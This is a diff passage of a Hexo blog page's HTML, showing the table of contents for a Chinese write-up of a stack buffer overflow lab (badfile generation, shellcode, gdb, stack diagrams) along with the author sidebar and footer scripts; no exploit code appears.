+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">1. 实验步骤：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-%E8%BF%90%E8%A1%8C-exploit-%E7%A8%8B%E5%BA%8F%EF%BC%8C%E7%94%9F%E6%88%90-badfile"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 运行 exploit 程序，生成 badfile</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-%E8%BF%90%E8%A1%8C-stack-%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%AE%9E%E6%96%BD%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%EF%BC%8C%E8%A7%82%E5%AF%9F-shellcode-%E7%9A%84%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 运行 stack 程序，实施栈溢出利用，观察 shellcode 的执行效果</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="nav-number">2.</span> <span class="nav-text">2. 攻击执行过程详解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-badfile%E7%94%9F%E6%88%90"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 badfile生成</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-stack%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B1%87%E7%BC%96%E7%A0%94%E7%A9%B6"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 stack程序的汇编研究</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-bof%E4%B8%ADret%E6%97%B6%E5%8F%91%E7%94%9F%E7%9A%84Buffer-Overflow%E8%B7%B3%E8%BD%AC%E7%8E%B0%E8%B1%A1"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 bof中ret时发生的Buffer Overflow跳转现象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4-%E4%BD%BF%E7%94%A8gdb%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 使用gdb调试程序</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%90%84%E5%85%B3%E9%94%AE%E6%97%B6%E5%88%BB%E7%9A%84%E6%A0%88%E7%A4%BA%E6%84%8F%E5%9B%BE"><span class="nav-number">3.</span> <span class="nav-text">3. 各关键时刻的栈示意图</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8C%E9%98%B6%E6%AE%B5%EF%BC%9A"><span class="nav-number">3.0.1.</span> <span class="nav-text">正常运行阶段：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#main-call-fread%E5%90%8E%EF%BC%8Cfread-ret%E5%89%8D%EF%BC%9A"><span class="nav-number">3.0.1.1.</span> <span class="nav-text">main call fread后，fread ret前：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#main-call-bof-%E5%89%8D%EF%BC%9A"><span class="nav-number">3.0.1.2.</span> <span class="nav-text">main call bof 前：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#main-call-bof%E5%90%8E%EF%BC%8Cbof-call-strcpy%E5%89%8D%EF%BC%9A"><span class="nav-number">3.0.1.3.</span> <span class="nav-text">main call bof后，bof call strcpy前：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#main-call-bof%E5%90%8E%EF%BC%8Cbof-call-strpy%E5%90%8E%EF%BC%8Cstrcpy%E8%BF%90%E8%A1%8C%E4%B8%AD%EF%BC%9A"><span class="nav-number">3.0.1.4.</span> <span class="nav-text">main call bof后，bof call strpy后，strcpy运行中：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#buffer-overflow%E5%AF%BC%E8%87%B4%E9%97%AE%E9%A2%98%E5%87%BA%E7%8E%B0%E7%9A%84%E9%98%B6%E6%AE%B5"><span class="nav-number">3.0.2.</span> <span class="nav-text">buffer overflow导致问题出现的阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#main-call-bof%E5%90%8E%EF%BC%8Cbof-call-strpy%E5%90%8E%EF%BC%8Cstrcpy%E5%AE%8C%E6%88%90%E5%A4%8D%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B7%A5%E4%BD%9C%EF%BC%8C%E4%BD%86%E5%B9%B6%E6%9C%AAreturn%EF%BC%9A"><span class="nav-number">3.0.2.1.</span> <span class="nav-text">main call bof后，bof call strpy后，strcpy完成复制字符串工作，但并未return：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#main-call-bof%E5%90%8E%EF%BC%8Cbof-call-strpy%E5%90%8E%EF%BC%8C%E4%B8%94strcpy%E8%BF%94%E5%9B%9E%E5%90%8E%EF%BC%9A"><span class="nav-number">3.0.2.2.</span> <span class="nav-text">main call bof后，bof call strpy后，且strcpy返回后：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#bof-return-%E5%90%8E%EF%BC%88%E6%B2%A1%E6%9C%89%E8%BF%94%E5%9B%9Emain%E8%80%8C%E6%98%AF%E8%A2%AB%E5%AE%9A%E4%BD%8D%E5%88%B0%E4%BA%86%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E4%BD%8D%E7%BD%AE0xffff1d76%EF%BC%89%EF%BC%9A"><span class="nav-number">3.0.2.3.</span> <span class="nav-text">bof return 后（没有返回main而是被定位到了恶意代码位置0xffff1d76）：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A6%82%E6%9E%9C%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8C%EF%BC%8C%E5%BA%94%E8%AF%A5%E7%BB%8F%E5%8E%86%E7%9A%84%E9%98%B6%E6%AE%B5"><span class="nav-number">3.0.3.</span> <span class="nav-text">如果正常运行，应该经历的阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%EF%BC%88%E7%94%B1%E4%BA%8Ebuffer-overflow%EF%BC%8C%E5%AE%9E%E9%99%85%E6%9C%AA%E5%8F%91%E7%94%9F%EF%BC%89main-call-bof%E5%90%8E%EF%BC%8Cbof-leave%E5%90%8Eret%E5%89%8D%EF%BC%9A"><span class="nav-number">3.0.3.1.</span> <span class="nav-text">（由于buffer overflow，实际未发生）main call bof后，bof leave后ret前：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%EF%BC%88%E7%94%B1%E4%BA%8Ebuffer-overflow%E5%AE%9E%E9%99%85%E6%9C%AA%E5%8F%91%E7%94%9F%EF%BC%89bof-ret%E5%90%8E%EF%BC%9A"><span class="nav-number">3.0.3.2.</span> <span class="nav-text">（由于buffer overflow实际未发生）bof ret后：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%99%84%EF%BC%9A%E5%AE%9E%E9%AA%8C%E6%89%80%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%90%88"><span class="nav-number">3.0.4.</span> <span class="nav-text">附：实验所用程序集合</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fireknight"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">fireknight</p>
+  <div class="site-description" itemprop="description">fireknight-hJ的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fireknight-hJ" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fireknight-hJ" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:jhao00251@gmail.com" title="E-Mail → mailto:jhao00251@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://github.com/fireknight-hJ" title="https:&#x2F;&#x2F;github.com&#x2F;fireknight-hJ" rel="noopener" target="_blank">github_site</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fireknight</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">76k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:09</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/three-waves.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+    <script defer src="/lib/three/canvas_sphere.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : true,
+      notify     : true,
+      appId      : 'R8brtkIXPg6UVi6tzdQm1aIC-gzGzoHsz',
+      appKey     : '3XexM3rU032vWyOvDGsWO4Fp',
+      placeholder: "ヾﾉ≧∀≦)o来啊, 快活啊!",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : 'zh-CN' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+  
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas>
+    <script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script src="/js/cursor/explosion.min.js"></script>
+  
+  
+  
+  <!--页面点击小桃心-->
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
